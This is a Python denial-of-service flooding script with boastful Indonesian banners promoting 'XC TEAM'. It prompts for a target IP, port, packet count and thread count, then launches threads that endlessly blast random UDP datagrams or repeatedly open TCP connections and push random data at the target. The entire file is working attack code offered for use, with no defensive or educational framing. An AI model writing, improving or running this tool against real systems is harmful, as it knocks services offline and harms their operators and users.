import random
import socket
import threading

print       (" - - > LORD RAZZEL NI DEK!! < - - ")
print       (" - - > Ada Masalah apa Sih Mau DDOS Gas! < - - ")
print       (" - - > Join XC TEAM <- - ")                                   
print       (" - - > Rename Pm Gw !! < - - ")
print       (" - - > Jangan Abause Ya Adek Adek! < - - ")
print       (" - - > Yaudah Dari Pada Bacod Gas Aja Yakan! < - - ")
print       (" - - >  XC TEAM NI DEK KATA MEMET < - - ")
    
ip = str(input("  Ip:"))
port = int(input(" Port:"))
choice = str(input(" SERIUS MAU NYERANG? (y/n):"))
times = int(input(" Paket Nya Mau Berapa:"))
threads = int(input(" Pelor Nya Tembakin Berapa:"))
def run():
	data = random._urandom(1000)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" EASY KALI MENN!!! ")
		except:
			print("[!] YAHAHA DOWN HAYUKK!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" EASY KALI MENN!!! ")
		except:
			s.close()
			print("[*] YAHAHA DOWN HAYUKK!!!")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()